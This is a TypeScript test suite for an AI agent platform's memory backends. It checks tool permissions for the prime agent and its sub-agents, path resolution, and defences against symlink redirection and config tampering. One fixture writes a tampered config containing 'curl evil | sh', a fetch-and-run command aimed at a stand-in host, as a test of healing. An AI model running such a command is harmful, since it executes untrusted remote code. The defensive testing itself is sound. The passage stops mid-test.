import assert from "node:assert/strict";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { after, test } from "node:test";

import type { MemoryBinding } from "@tangent/shared/contracts.ts";
import { parse as parseYaml } from "yaml";

// Point roots at throwaway dirs before importing config-reading modules.
const SESS = mkdtempSync(path.join(tmpdir(), "mem-sess-"));
const SHARED = mkdtempSync(path.join(tmpdir(), "mem-shared-"));
const MEM = mkdtempSync(path.join(tmpdir(), "mem-global-"));
const QMD = mkdtempSync(path.join(tmpdir(), "mem-qmd-"));
process.env.SESSIONS_ROOT = SESS;
process.env.SHARED_ROOT = SHARED;
process.env.GLOBAL_MEMORY_DIR = MEM;
process.env.QMD_STATE_ROOT = QMD;

const { CompositeMemory } = await import("./composite.ts");
const { PiMemory } = await import("./piMemory.ts");
const { SharedMarkdownMemory } = await import("./sharedMarkdown.ts");
const { SimpleMdMemory } = await import("./simpleMd.ts");
const { MemoryResolver } = await import("./resolver.ts");
const { BundleKbRegistry } = await import("./bundleKbRegistry.ts");
const { BundleKnowledgeMemory } = await import("./bundleKnowledge.ts");
const { settleBinding } = await import("./binding.ts");
const { removeSessionQmdState } = await import("./qmdState.ts");
const { nestedRoots } = await import("./paths.ts");
const { memoryBindingSchema } = await import("../pi/config/manifest.ts");
import type { SessionStore } from "../store/sessionStore.ts";
import type { MemoryBackend, MemoryContext } from "./types.ts";

after(() => {
  for (const dir of [SESS, SHARED, MEM, QMD]) {
    rmSync(dir, { recursive: true, force: true });
  }
});

const CTX: MemoryContext = { sessionId: "s1", rootPath: SESS };

/** A canonical store path that never exists. */
const PM = path.join(realpathSync(SESS), "no-such", "pm");
/** {@link PM}'s server-owned qmd state directory. */
const PM_QMD = path.join(QMD, "sessions", "no-such", "pm");

/** A fresh session root under {@link SESS}. */
function sessionRoot(name: string): string {
  const root = path.join(SESS, name);
  mkdirSync(root, { recursive: true });
  return root;
}

/** A trivial leaf used to probe composite routing without touching disk. */
function fakeLeaf(
  over: Partial<MemoryBackend> & { kind: string },
): MemoryBackend {
  return {
    kind: over.kind,
    init: over.init ?? (() => {}),
    preamble: over.preamble ?? (() => ""),
    describe: over.describe ?? (() => []),
    tools: over.tools ?? (() => []),
    spawn: over.spawn,
    execute: over.execute ?? (async () => undefined),
  };
}

/** The index entry of a loaded project store (shared note or pi-memory). */
const LOADED_STORE = /^- \*\*Project (?:note|memory \(pi-memory\))\*\*/m;
const DROPPED_NOTICE = /^- \*\*`[^`]+`\*\* \(unavailable\)/m;

/** The index entry flagging `label` as dropped. */
function droppedEntry(label: string): RegExp {
  return new RegExp(
    `^- \\*\\*\`${label.replace("/", "\\/")}\`\\*\\* \\(unavailable\\)`,
    "m",
  );
}

/** Asserts a preamble loads no project store and flags the binding as dropped. */
function assertDroppedOnly(preamble: string): void {
  assert.doesNotMatch(preamble, LOADED_STORE);
  assert.match(preamble, DROPPED_NOTICE);
}

test("CompositeMemory concatenates preambles and routes execute to the owner", async () => {
  const a = fakeLeaf({
    kind: "a",
    preamble: () => "A-pre",
    execute: async (name) => (name === "ta" ? { text: "from-a" } : undefined),
  });
  const b = fakeLeaf({
    kind: "b",
    preamble: () => "B-pre",
    execute: async (name) => (name === "tb" ? { text: "from-b" } : undefined),
  });
  const composite = new CompositeMemory([a, b]);

  assert.equal(composite.preamble(CTX, "prime"), "A-pre\n\nB-pre");
  assert.equal(
    (await composite.execute("tb", {}, CTX, "prime"))?.text,
    "from-b",
  );
  assert.equal(await composite.execute("unknown", {}, CTX, "prime"), undefined);
});

test("CompositeMemory merges spawn extras and dedupes allowlist tools", () => {
  const a = fakeLeaf({
    kind: "a",
    spawn: () => ({ env: { A: "1", SHARED: "same" }, allowlistTools: ["x"] }),
  });
  const b = fakeLeaf({
    kind: "b",
    spawn: () => ({
      env: { B: "2", SHARED: "same" },
      extensionPaths: ["/ext/b.ts"],
      allowlistTools: ["x", "y"],
    }),
  });
  const extras = new CompositeMemory([a, b]).spawn(CTX, "prime");

  assert.deepEqual(extras.env, { A: "1", B: "2", SHARED: "same" });
  assert.deepEqual(extras.extensionPaths, ["/ext/b.ts"]);
  assert.deepEqual(new Set(extras.allowlistTools), new Set(["x", "y"]));
});

test("PiMemory grants all tools to prime and read-only to sub-agents", () => {
  const pi = new PiMemory(PM);

  const prime = pi.spawn(CTX, "prime");
  assert.equal(prime.env?.PI_MEMORY_DIR, PM);
  assert.equal(prime.extensionPaths?.length, 1);
  assert.deepEqual(
    new Set(prime.allowlistTools),
    new Set([
      "memory_write",
      "memory_forget",
      "memory_restore",
      "memory_read",
      "scratchpad",
      "memory_search",
      "memory_status",
    ]),
  );

  const sub = pi.spawn(CTX, "subagent");
  assert.deepEqual(
    new Set(sub.allowlistTools),
    new Set(["memory_read", "memory_search", "memory_status"]),
  );
  assert.equal(pi.tools().length, 0);
});

test("PiMemory maps config onto env knobs and drops search when disabled", () => {
  const pi = new PiMemory(PM, {
    exitSummary: false,
    snapshot: "per-turn",
    qmdUpdate: "off",
    search: false,
    exitSummaryModel: "anthropic/claude",
  });
  const prime = pi.spawn(CTX, "prime");

  assert.deepEqual(prime.env, {
    PI_MEMORY_DIR: PM,
    INDEX_PATH: path.join(PM_QMD, "index.sqlite"),
    QMD_CONFIG_DIR: PM_QMD,
    PI_MEMORY_EXIT_SUMMARY: "0",
    PI_MEMORY_SNAPSHOT: "per-turn",
    PI_MEMORY_QMD_UPDATE: "off",
    PI_MEMORY_NO_SEARCH: "1",
    PI_MEMORY_EXIT_SUMMARY_MODEL: "anthropic/claude",
  });
  assert.equal(prime.allowlistTools?.includes("memory_search"), false);
});

test("PiMemory with no config leaves every knob at pi-memory's defaults", () => {
  const prime = new PiMemory(PM).spawn(CTX, "prime");
  assert.deepEqual(prime.env, {
    PI_MEMORY_DIR: PM,
    INDEX_PATH: path.join(PM_QMD, "index.sqlite"),
    QMD_CONFIG_DIR: PM_QMD,
  });
});

test("PiMemory sub-agents never write exit summaries or update the index", () => {
  const sub = new PiMemory(PM, { exitSummary: true }).spawn(CTX, "subagent");
  assert.equal(sub.env?.PI_MEMORY_EXIT_SUMMARY, "0");
  assert.equal(sub.env?.PI_MEMORY_QMD_UPDATE, "off");
});

test("PiMemory scopes the qmd index to each store directory", () => {
  const a = new PiMemory(path.join(SESS, "no-such", "a")).spawn(CTX, "prime");
  const b = new PiMemory(path.join(SESS, "no-such", "b")).spawn(CTX, "prime");

  assert.notEqual(a.env?.INDEX_PATH, b.env?.INDEX_PATH);
  assert.notEqual(a.env?.QMD_CONFIG_DIR, b.env?.QMD_CONFIG_DIR);
});

test("PiMemory describes only the tools each role has, and injects no preamble", () => {
  const pi = new PiMemory(PM);
  const text = (role: "prime" | "subagent", leaf = pi) =>
    JSON.stringify(leaf.describe(CTX, role));
  assert.equal(pi.preamble(), "");
  assert.match(text("prime"), /memory_write/);
  assert.doesNotMatch(text("subagent"), /memory_write|scratchpad/);
  assert.match(text("subagent"), /memory_search/);

  const noSearch = new PiMemory(PM, { search: false });
  assert.doesNotMatch(text("prime", noSearch), /memory_search/);
});

test("SimpleMd rejects writes from sub-agents", async () => {
  const simpleMd = new SimpleMdMemory();
  for (const name of ["remember", "suggest_memory"]) {
    const result = await simpleMd.execute(name, { text: "x" }, CTX, "subagent");
    assert.equal(result?.error, true, `${name} is rejected for sub-agents`);
    assert.equal(result?.effects, undefined);
  }
  const read = await simpleMd.execute("read_memory", {}, CTX, "subagent");
  assert.equal(read?.error, undefined, "sub-agents can still read");
});

test("SimpleMd validates remember and suggest params", async () => {
  const simpleMd = new SimpleMdMemory();
  const ctx = { sessionId: "s1", rootPath: sessionRoot("validate") };

  const blank = await simpleMd.execute(
    "remember",
    { title: "Fact", text: "   " },
    ctx,
    "prime",
  );
  assert.equal(blank?.error, true, "blank text is rejected");
  const untitled = await simpleMd.execute(
    "remember",
    { text: "fact" },
    ctx,
    "prime",
  );
  assert.equal(untitled?.error, true, "a fact without a title is rejected");
  const badScope = await simpleMd.execute(
    "suggest_memory",
    { title: "Fact", text: "fact", scope: "everywhere" },
    ctx,
    "prime",
  );
  assert.equal(badScope?.error, true, "an unknown scope is rejected");
  assert.equal(simpleMd.readSession(ctx.rootPath), "", "nothing was written");

  const ok = await simpleMd.execute(
    "remember",
    { title: " Fact ", text: " fact ", tags: ["build tools"] },
    ctx,
    "prime",
  );
  assert.equal(ok?.error, undefined);
  assert.deepEqual(ok?.effects, [
    {
      kind: "remembered",
      scope: "session",
      text: "### Fact\nfact\n\n#build-tools",
    },
  ]);
});

test("the binding schema allows at most one pi-memory leaf", () => {
  const two: MemoryBinding = {
    kind: "composite",
    children: [
      { kind: "pi-memory", root: "a/mem" },
      { kind: "composite", children: [{ kind: "pi-memory", root: "b/mem" }] },
    ],
  };
  assert.equal(memoryBindingSchema.safeParse(two).success, false);

  const one: MemoryBinding = {
    kind: "composite",
    children: [
      { kind: "simple-md", root: "notes" },
      { kind: "pi-memory", root: "a/mem" },
    ],
  };
  assert.equal(memoryBindingSchema.safeParse(one).success, true);
});

/** A SessionStore stub whose only live methods are getSessionMemory and getSession. */
function sessionStoreWith(
  binding: MemoryBinding | undefined,
  bundleId?: string,
): SessionStore {
  return {
    getSessionMemory: async () => binding,
    getSession: async () =>
      bundleId
        ? { config: { id: bundleId, name: bundleId, version: "1" } }
        : {},
  } as unknown as SessionStore;
}

/** Resolves `binding` for a session rooted at `root` that mounted `mounts`. */
function resolveWith(
  binding: MemoryBinding | undefined,
  root = SESS,
  mounts: string[] = [],
) {
  const resolver = new MemoryResolver(
    new SimpleMdMemory(),
    sessionStoreWith(binding),
    async () => mounts,
  );
  return resolver.resolve("s1", root);
}

test("resolveDefault is SimpleMD only (no shared extension or env)", () => {
  const resolver = new MemoryResolver(new SimpleMdMemory());
  const plan = resolver.resolveDefault("s1", SESS).spawnPlan("prime");

  assert.equal(plan.extensionPaths.length, 0);
  assert.deepEqual(plan.env, {});
  assert.ok(plan.allowlistTools.includes("read_memory"));
  assert.equal(plan.allowlistTools.includes("memory_write"), false);
});

test("resolve points a pi-memory root into a mounted folder at its real path", async () => {
  const root = sessionRoot("mounted");
  const folder = path.join(SHARED, "folder-1");
  mkdirSync(folder);
  symlinkSync(folder, path.join(root, "proj"), "dir");

  const resolved = await resolveWith(
    { kind: "pi-memory", root: "proj/pi-memory" },
    root,
    [folder],
  );
  resolved.init();
  const plan = resolved.spawnPlan("prime");

  const store = path.join(realpathSync(folder), "pi-memory");
  const qmdDir = path.join(QMD, "shared", "folder-1", "pi-memory");
  assert.equal(plan.env.PI_MEMORY_DIR, store);
  assert.equal(plan.env.INDEX_PATH, path.join(qmdDir, "index.sqlite"));
  assert.equal(plan.env.QMD_CONFIG_DIR, qmdDir);
  assert.equal(
    existsSync(path.join(store, ".qmd")),
    false,
    "no qmd state lands inside the shared folder",
  );
  assert.equal(plan.extensionPaths.length, 1);
  assert.ok(plan.allowlistTools.includes("read_memory"));
  assert.ok(plan.allowlistTools.includes("memory_write"));

  const preamble = resolved.preamble("prime");
  assert.match(preamble, /`proj\/pi-memory\/` in your workspace/);
  assert.ok(
    preamble.includes(`canonical path \`${store}/\``),
    "the preamble maps the workspace path to the path tools report",
  );
});

test("a session-local pi-memory store names only its workspace path", async () => {
  const root = realpathSync(sessionRoot("local-label"));
  const resolved = await resolveWith({ kind: "pi-memory" }, root);
  resolved.init();
  const preamble = resolved.preamble("prime");

  assert.match(preamble, /`\.pi-memory\/` in your workspace/);
  assert.doesNotMatch(preamble, /canonical path/);
});

test("the shared note tells a missing note from a written one", () => {
  const dir = path.join(SHARED, "notes");
  mkdirSync(dir, { recursive: true });
  const note = new SharedMarkdownMemory(dir, "project/NOTES");

  assert.match(
    note.preamble(),
    /`project\/NOTES\/MEMORY\.md`\n\n\(not created yet\)/,
  );
  const [missing] = note.describe(CTX, "prime");
  assert.deepEqual(missing.write, { file: "project/NOTES/MEMORY.md" });
  assert.match(missing.notes?.join(" ") ?? "", /doesn't exist yet/);
  assert.equal(note.describe(CTX, "subagent")[0].write, undefined);

  writeFileSync(path.join(dir, "MEMORY.md"), "Use pnpm.\n");
  assert.match(note.preamble(), /Use pnpm\./);
  const [written] = note.describe(CTX, "prime");
  assert.deepEqual(written.notes, []);
  assert.deepEqual(written.digest, { entries: 1, chars: 9, mode: "inline" });
});

test("resolve leaves out a pi-memory store whose folder is gone", async (t) => {
  const warn = t.mock.method(console, "warn", () => {});
  const root = sessionRoot("unmounted");
  const resolved = await resolveWith(
    { kind: "pi-memory", root: "proj/pi-memory" },
    root,
  );
  resolved.init();

  assert.equal(resolved.spawnPlan("prime").extensionPaths.length, 0);
  assert.equal(
    existsSync(path.join(root, "proj")),
    false,
    "nothing is created at the mount name",
  );
  assert.equal(warn.mock.callCount(), 1);
});

test("settleBinding keeps a pi-memory root inside a seeded mount", () => {
  const root = sessionRoot("settle-mounted");
  const folder = path.join(SHARED, "settle-folder");
  mkdirSync(folder);
  symlinkSync(folder, path.join(root, "proj"), "dir");
  const binding: MemoryBinding = { kind: "pi-memory", root: "proj/pi-memory" };

  assert.deepEqual(settleBinding(binding, "s1", root, [folder]), binding);
});

test("settleBinding always keeps the default session-local root", () => {
  const root = sessionRoot("settle-default");
  const binding: MemoryBinding = { kind: "pi-memory" };
  assert.deepEqual(settleBinding(binding, "s1", root, []), binding);
});

test("settleBinding drops a pi-memory root whose mount wasn't seeded", (t) => {
  t.mock.method(console, "warn", () => {});
  const root = sessionRoot("settle-unseeded");
  mkdirSync(path.join(root, "notes"));
  const note: MemoryBinding = { kind: "simple-md", root: "notes" };

  assert.equal(
    settleBinding(
      { kind: "pi-memory", root: "proj/pi-memory" },
      "s1",
      root,
      [],
    ),
    undefined,
  );
  assert.deepEqual(
    settleBinding(
      {
        kind: "composite",
        children: [note, { kind: "pi-memory", root: "proj/pi-memory" }],
      },
      "s1",
      root,
      [],
    ),
    { kind: "composite", children: [note] },
    "sibling leaves survive",
  );
  assert.equal(existsSync(path.join(root, "proj")), false);
});

test("settleBinding treats a dangling mount symlink as missing", (t) => {
  t.mock.method(console, "warn", () => {});
  const root = sessionRoot("settle-dangling");
  const folder = path.join(SHARED, "never-created");
  symlinkSync(folder, path.join(root, "proj"), "dir");

  assert.equal(
    settleBinding({ kind: "pi-memory", root: "proj/pi-memory" }, "s1", root, [
      folder,
    ]),
    undefined,
  );
});

test("SimpleMd only tells Prime how to write memory", () => {
  const resolver = new MemoryResolver(new SimpleMdMemory());
  const resolved = resolver.resolveDefault(
    "s1",
    sessionRoot("simple-preamble"),
  );

  assert.match(resolved.preamble("prime"), /Write: `remember`/);
  const sub = resolved.preamble("subagent");
  assert.doesNotMatch(sub, /remember|suggest_memory/);
  assert.match(sub, /read-only for you/);
  assert.match(sub, /### Session memory\n\n\(empty\)/);
});

test("resolve defaults a rootless pi-memory binding to a session-local dir", async () => {
  const plan = (await resolveWith({ kind: "pi-memory" })).spawnPlan("prime");
  assert.equal(
    plan.env.PI_MEMORY_DIR,
    path.join(realpathSync(SESS), ".pi-memory"),
  );
});

test("resolve compares against an absolute session root", async () => {
  const relative = path.relative(process.cwd(), SESS);
  const plan = (await resolveWith({ kind: "pi-memory" }, relative)).spawnPlan(
    "prime",
  );
  assert.equal(plan.extensionPaths.length, 1, "the binding is not dropped");
});

test("resolve falls back to SimpleMD when the session has no binding", async () => {
  const plan = (await resolveWith(undefined)).spawnPlan("prime");
  assert.equal(plan.extensionPaths.length, 0);
  assert.deepEqual(plan.env, {});
});

test("resolve rejects a binding root that escapes the session root", async () => {
  const plan = (
    await resolveWith({ kind: "pi-memory", root: "../escape" })
  ).spawnPlan("prime");
  assert.equal(plan.extensionPaths.length, 0);
  assert.deepEqual(plan.env, {});
});

test("resolve rejects a binding root that is the session root itself", async () => {
  for (const binding of [
    { kind: "pi-memory", root: "." },
    { kind: "simple-md", root: "." },
  ] satisfies MemoryBinding[]) {
    const resolved = await resolveWith(binding);
    assert.equal(resolved.spawnPlan("prime").extensionPaths.length, 0);
    assertDroppedOnly(resolved.preamble("prime"));
  }
});

test("a binding root with a .qmd segment is rejected", async (t) => {
  const warn = t.mock.method(console, "warn", () => {});
  for (const binding of [
    { kind: "pi-memory", root: "proj/.qmd" },
    { kind: "simple-md", root: ".qmd/notes" },
  ] satisfies MemoryBinding[]) {
    assert.equal(memoryBindingSchema.safeParse(binding).success, false);
  }

  const resolved = await resolveWith(
    { kind: "pi-memory", root: ".pi-memory/.qmd" },
    sessionRoot("qmd-segment"),
  );
  assert.equal(resolved.spawnPlan("prime").extensionPaths.length, 0);
  assert.equal(warn.mock.callCount(), 1);
});

test("resolve degrades two pi-memory children to SimpleMD only", async () => {
  const root = sessionRoot("two-pi");
  const plan = (
    await resolveWith(
      {
        kind: "composite",
        children: [
          { kind: "pi-memory", root: ".pi-memory/a" },
          { kind: "pi-memory", root: ".pi-memory/b" },
        ],
      },
      root,
    )
  ).spawnPlan("prime");
  assert.equal(plan.extensionPaths.length, 0);
  assert.deepEqual(plan.env, {});
});

test("a sub-agent's plan denies every memory write tool Prime gets", async () => {
  const resolved = await resolveWith({ kind: "pi-memory" });

  assert.deepEqual(resolved.spawnPlan("prime").deniedTools, []);
  assert.deepEqual(
    new Set(resolved.spawnPlan("subagent").deniedTools),
    new Set([
      "remember",
      "suggest_memory",
      "memory_write",
      "memory_forget",
      "memory_restore",
      "scratchpad",
    ]),
  );
});

interface MountedSession {
  root: string;
  /** The shared folder's backing directory, as the catalog's mount row names it. */
  folder: string;
}

/** A session root with shared folder `folderId` mounted as `proj`. */
function mountedSession(name: string, folderId: string): MountedSession {
  const root = sessionRoot(name);
  const folder = path.join(SHARED, folderId);
  mkdirSync(folder, { recursive: true });
  symlinkSync(folder, path.join(root, "proj"), "dir");
  return { root, folder };
}

/** The prime spawn env for a pi-memory binding rooted at `rel` in `session`. */
async function piMemoryEnv(session: MountedSession | string, rel?: string) {
  const { root, folder } =
    typeof session === "string"
      ? { root: session, folder: undefined }
      : session;
  const resolved = await resolveWith(
    { kind: "pi-memory", root: rel },
    root,
    folder ? [folder] : [],
  );
  resolved.init();
  return resolved.spawnPlan("prime").env;
}

test("sessions share a qmd index only when they resolve to the same store", async () => {
  const a = await piMemoryEnv(mountedSession("iso-a", "f-same"), "proj/mem");
  const b = await piMemoryEnv(mountedSession("iso-b", "f-same"), "proj/mem");
  const other = await piMemoryEnv(
    mountedSession("iso-c", "f-other"),
    "proj/mem",
  );
  const subpath = await piMemoryEnv(
    mountedSession("iso-d", "f-same"),
    "proj/x",
  );
  const local = await piMemoryEnv(sessionRoot("iso-e"));

  assert.equal(a.INDEX_PATH, b.INDEX_PATH);
  assert.equal(a.QMD_CONFIG_DIR, b.QMD_CONFIG_DIR);
  for (const env of [other, subpath, local]) {
    assert.notEqual(env.INDEX_PATH, a.INDEX_PATH);
  }
  assert.equal(
    local.INDEX_PATH,
    path.join(QMD, "sessions", "iso-e", ".pi-memory", "index.sqlite"),
  );
  const shared = realpathSync(SHARED);
  for (const env of [a, other, subpath, local]) {
    assert.equal(env.INDEX_PATH.startsWith(shared), false);
  }
});

test("init writes a qmd config with only the store's collection and heals tampering", async () => {
  const session = mountedSession("qmd-config", "f-config");
  const env = await piMemoryEnv(session, "proj/mem");
  const configFile = path.join(env.QMD_CONFIG_DIR, "index.yml");
  const expected = {
    collections: {
      "pi-memory": {
        path: path.join(realpathSync(SHARED), "f-config", "mem"),
        pattern: "**/*.md",
        context: {
          "/daily": "Daily append-only work logs organized by date",
          "/": "Curated long-term memory: decisions, preferences, facts, lessons",
        },
      },
    },
  };
  assert.deepEqual(parseYaml(readFileSync(configFile, "utf8")), expected);
  assert.deepEqual(
    readdirSync(env.QMD_CONFIG_DIR),
    ["index.yml"],
    "the atomic write leaves no temp file behind",
  );

  writeFileSync(
    configFile,
    "collections:\n  pi-memory:\n    path: /\n    update: curl evil | sh\n",
  );
  await piMemoryEnv(session, "proj/mem");
  assert.deepEqual(parseYaml(readFileSync(configFile, "utf8")), expected);
});

/** Asserts `binding` resolves to no store for `session` and is not settled. */
async function assertRedirectRejected(
  session: MountedSession,
  binding: MemoryBinding,
): Promise<void> {
  const resolved = await resolveWith(binding, session.root, [session.folder]);
  assert.equal(resolved.spawnPlan("prime").extensionPaths.length, 0);
  assertDroppedOnly(resolved.preamble("prime"));
  assert.equal(
    settleBinding(binding, "s1", session.root, [session.folder]),
    binding.kind === "pi-memory" ? undefined : binding,
  );
}

const REDIRECTABLE: MemoryBinding[] = [
  { kind: "pi-memory", root: "proj/mem" },
  { kind: "simple-md", root: "proj/mem" },
];

/** True when some `console.warn` call reported a symlink redirect. */
function warnedRedirect(warn: { mock: { calls: { arguments: unknown[] }[] } }) {
  return warn.mock.calls.some((call) =>
    /resolves through a symlink/.test(call.arguments.map(String).join(" ")),
  );
}

test("a binding root symlinked out of the allowed folders is rejected", async (t) => {
  const warn = t.mock.method(console, "warn", () => {});
  const victim = sessionRoot("victim");
  mkdirSync(path.join(victim, ".pi-memory"), { recursive: true });
  const session = mountedSession("redirect", "f-redirect");
  symlinkSync(
    path.join(victim, ".pi-memory"),
    path.join(session.root, "proj", "mem"),
  );

  for (const binding of REDIRECTABLE) {
    await assertRedirectRejected(session, binding);
  }
  assert.ok(warnedRedirect(warn));
});

test("a link planted in a mounted folder can't reach an unmounted folder", async (t) => {
  const warn = t.mock.method(console, "warn", () => {});
  const unmounted = path.join(SHARED, "f-unmounted-a", "mem");
  mkdirSync(unmounted, { recursive: true });
  const session = mountedSession("planted", "f-planted");
  symlinkSync(unmounted, path.join(session.folder, "mem"));

  for (const binding of REDIRECTABLE) {
    await assertRedirectRejected(session, binding);
  }
  assert.ok(warnedRedirect(warn));
});

test("a re-pointed mount symlink can't reach an unmounted folder", async (t) => {
  const warn = t.mock.method(console, "warn", () => {});
  const unmounted = path.join(SHARED, "f-unmounted-b");
  mkdirSync(path.join(unmounted, "mem"), { recursive: true });
  const session = mountedSession("repointed", "f-repointed");
  rmSync(path.join(session.root, "proj"));
  symlinkSync(unmounted, path.join(session.root, "proj"), "dir");

  for (const binding of REDIRECTABLE) {
    await assertRedirectRejected(session, binding);
  }
  assert.ok(warnedRedirect(warn));
});

test("relinking the store after resolution doesn't move its path or index", async () => {
  const victim = sessionRoot("relink-victim");
  mkdirSync(path.join(victim, ".pi-memory"), { recursive: true });
  const session = mountedSession("relink", "f-relink");
  mkdirSync(path.join(session.folder, "mem"));
  const resolved = await resolveWith(
    { kind: "pi-memory", root: "proj/mem" },
    session.root,
    [session.folder],
  );
  resolved.init();
  const before = resolved.spawnPlan("prime").env;

  rmSync(path.join(session.folder, "mem"), { recursive: true });
  symlinkSync(
    path.join(victim, ".pi-memory"),
    path.join(session.folder, "mem"),
  );
  const after = resolved.spawnPlan("subagent").env;

  assert.equal(after.PI_MEMORY_DIR, before.PI_MEMORY_DIR);
  assert.equal(after.INDEX_PATH, before.INDEX_PATH);
  assert.equal(
    after.INDEX_PATH,
    path.join(QMD, "shared", "f-relink", "mem", "index.sqlite"),
  );
});

test("a pi-memory root may name a mounted folder itself", async () => {
  const session = mountedSession("mount-root", "f-mount-root");
  const binding: MemoryBinding = { kind: "pi-memory", root: "proj" };
  const env = await piMemoryEnv(session, "proj");

  assert.equal(env.PI_MEMORY_DIR, realpathSync(session.folder));
  assert.equal(env.QMD_CONFIG_DIR, path.join(QMD, "shared", "f-mount-root"));
  assert.deepEqual(
    settleBinding(binding, "s1", session.root, [session.folder]),
    binding,
  );
});

test("a simple-md root may name a mounted folder itself", async () => {
  const session = mountedSession("note-mount-root", "f-note-root");
  const resolved = await resolveWith(
    { kind: "simple-md", root: "proj" },
    session.root,
    [session.folder],
  );
  assert.match(resolved.preamble("prime"), /`proj\/MEMORY\.md`/);
});

test("a binding root linked back to the session root is rejected", async (t) => {
  const warn = t.mock.method(console, "warn", () => {});
  const root = sessionRoot("self-link");
  symlinkSync(root, path.join(root, "self"), "dir");

  for (const binding of [
    { kind: "pi-memory", root: "self" },
    { kind: "simple-md", root: "self" },
  ] satisfies MemoryBinding[]) {
    const resolved = await resolveWith(binding, root);
    assert.equal(resolved.spawnPlan("prime").extensionPaths.length, 0);
    assertDroppedOnly(resolved.preamble("prime"));
  }
  assert.ok(warnedRedirect(warn));
});

test("an invalid composite child is dropped without its siblings", async (t) => {
  const warn = t.mock.method(console, "warn", () => {});
  const resolved = await resolveWith(
    {
      kind: "composite",
      children: [{ kind: "simple-md", root: "." }, { kind: "pi-memory" }],
    },
    sessionRoot("bad-sibling"),
  );

  assert.equal(resolved.spawnPlan("prime").extensionPaths.length, 1);
  assert.equal(warn.mock.callCount(), 1);
});

test("a session-local store under a symlinked session root names only its workspace path", async () => {
  const real = realpathSync(sessionRoot("label-real"));
  const link = path.join(SESS, "label-link");
  symlinkSync(real, link, "dir");

  const preamble = (await resolveWith({ kind: "pi-memory" }, link)).preamble(
    "prime",
  );
  assert.match(preamble, /`\.pi-memory\/` in your workspace/);
  assert.doesNotMatch(preamble, /canonical path/);
});

test("a shared note symlinked outside its folder is not injected", (t) => {
  t.mock.method(console, "warn", () => {});
  const secret = path.join(sessionRoot("note-victim"), "MEMORY.md");
  writeFileSync(secret, "victim secret\n");
  const dir = path.join(SHARED, "note-link");
  mkdirSync(dir, { recursive: true });
  symlinkSync(secret, path.join(dir, "MEMORY.md"));

  const preamble = new SharedMarkdownMemory(dir, "proj").preamble();
  assert.doesNotMatch(preamble, /victim secret/);
});

test("a project-local qmd config above the session root leaves pi-memory out", async (t) => {
  const error = t.mock.method(console, "error", () => {});
  const parent = sessionRoot("stray-parent");
  mkdirSync(path.join(parent, ".qmd"));
  writeFileSync(path.join(parent, ".qmd", "index.yml"), "collections: {}\n");
  const root = path.join(parent, "sess");
  mkdirSync(root);

  const resolved = await resolveWith({ kind: "pi-memory" }, root);
  const plan = resolved.spawnPlan("prime");
  assert.equal(plan.extensionPaths.length, 0);
  assert.equal(plan.allowlistTools.includes("memory_search"), false);
  assert.deepEqual(plan.env, {});
  assert.doesNotMatch(resolved.preamble("prime"), /pi-memory/);
  assert.equal(error.mock.callCount(), 1);
});

test("a qmd config planted after resolution drops pi-memory from the next spawn", async (t) => {
  const error = t.mock.method(console, "error", () => {});
  const root = sessionRoot("stray-later");
  const resolved = await resolveWith({ kind: "pi-memory" }, root);
  assert.equal(resolved.spawnPlan("prime").extensionPaths.length, 1);

  mkdirSync(path.join(root, ".qmd"));
  writeFileSync(path.join(root, ".qmd", "index.yml"), "collections: {}\n");
  const plan = resolved.spawnPlan("prime");
  assert.equal(plan.extensionPaths.length, 0);
  assert.equal(plan.env.INDEX_PATH, undefined);
  assert.equal(error.mock.callCount(), 1);

  rmSync(path.join(root, ".qmd"), { recursive: true });
  assert.equal(resolved.spawnPlan("prime").extensionPaths.length, 1);
});

test("nestedRoots flags roots that coincide or nest, and passes disjoint ones", () => {
  const base = realpathSync(mkdtempSync(path.join(tmpdir(), "mem-roots-")));
  const a = path.join(base, "a");
  const b = path.join(base, "b");
  const c = path.join(base, "c");

  assert.equal(nestedRoots({ a, b, c }), undefined);
  assert.deepEqual(nestedRoots({ a, b, c: path.join(a, "c") }), ["a", "c"]);
  assert.deepEqual(nestedRoots({ a, b: a }), ["a", "b"]);
  assert.deepEqual(nestedRoots({ a: path.join(b, "a"), b }), ["a", "b"]);
  rmSync(base, { recursive: true, force: true });
});

test("removeSessionQmdState drops only that session's qmd state", () => {
  const mine = path.join(QMD, "sessions", "gone", ".pi-memory");
  const theirs = path.join(QMD, "sessions", "kept", ".pi-memory");
  mkdirSync(mine, { recursive: true });
  mkdirSync(theirs, { recursive: true });

  removeSessionQmdState("gone");
  removeSessionQmdState("..");
  assert.equal(existsSync(mine), false);
  assert.equal(existsSync(theirs), true);
});

test("a simple-md root naming an absent mount is dropped, not created", async (t) => {
  t.mock.method(console, "warn", () => {});
  const root = sessionRoot("note-unmounted");
  const binding: MemoryBinding = { kind: "simple-md", root: "proj/notes" };

  assert.equal(settleBinding(binding, "s1", root, []), undefined);
  const preamble = (await resolveWith(binding, root)).preamble("prime");
  assertDroppedOnly(preamble);
  assert.doesNotMatch(preamble, /create `proj/);
  assert.equal(existsSync(path.join(root, "proj")), false);
});

test("an oversized shared note shows its sections with line ranges", () => {
  const dir = path.join(SHARED, "big-note");
  mkdirSync(dir, { recursive: true });
  writeFileSync(
    path.join(dir, "MEMORY.md"),
    `## Setup\n\n${"x".repeat(5000)}\n\n## Release TAIL\n\nship it\n`,
  );

  const preamble = new SharedMarkdownMemory(dir, "proj").preamble();
  assert.doesNotMatch(preamble, /xxxx/);
  assert.match(preamble, /^- `[0-9a-f]{6}` L1-3 Setup$/m);
  assert.match(preamble, /^- `[0-9a-f]{6}` L5-7 Release TAIL$/m);
  assert.match(preamble, /line range from `proj\/MEMORY\.md`/);
});

test("a store whose mount was removed surfaces the unavailable notice", async (t) => {
  t.mock.method(console, "warn", () => {});
  const session = mountedSession("unmount-notice", "f-unmount");
  mkdirSync(path.join(session.folder, "mem"));

  const resolved = await resolveWith(
    { kind: "pi-memory", root: "proj/mem" },
    session.root,
    [],
  );
  assert.equal(resolved.spawnPlan("prime").extensionPaths.length, 0);
  const preamble = resolved.preamble("prime");
  assertDroppedOnly(preamble);
  assert.match(preamble, droppedEntry("proj/mem"));
});

test("a dropped composite child is flagged beside its surviving siblings", async (t) => {
  t.mock.method(console, "warn", () => {});
  const resolved = await resolveWith(
    {
      kind: "composite",
      children: [{ kind: "simple-md", root: "gone" }, { kind: "pi-memory" }],
    },
    sessionRoot("partial-drop"),
  );

